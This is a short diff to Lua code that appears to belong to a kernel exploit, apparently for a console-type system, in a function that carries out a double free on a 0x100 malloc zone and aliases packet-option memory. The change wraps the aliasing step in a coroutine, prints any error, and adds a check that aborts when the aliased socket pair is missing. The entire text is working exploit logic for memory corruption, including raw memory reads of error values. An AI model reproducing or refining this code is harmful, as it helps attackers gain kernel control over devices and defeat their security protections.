@@ -1371,10 +1371,17 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
     -- we reclaim first since the sanity checking here is longer which makes it
     -- more likely that we have another process claim the memory
     
-    -- RESTORE: double freed memory has been reclaimed with harmless data
-    -- PANIC: 0x100 malloc zone pointers aliased
-    local sd_pair = make_aliased_pktopts(sds)
+    local sd_pair = nil
+    local err = run_with_coroutine(function()
+        -- RESTORE: double freed memory has been reclaimed with harmless data
+        -- PANIC: 0x100 malloc zone pointers aliased
+        sd_pair = make_aliased_pktopts(sds)
+    end)
 
+    if err then
+        print(err)
+    end
+    
     local err1 = memory.read_dword(sce_errs):tonumber()
     local err2 = memory.read_dword(sce_errs+4):tonumber()
     dbgf("delete errors: %s %s", hex(err1), hex(err2))
@@ -1396,7 +1403,7 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds)
         success = false
     end
 
-    if not success then
+    if sd_pair == nil or success == false then
         error("ERROR: double free on a 0x100 malloc zone failed")
     end
 
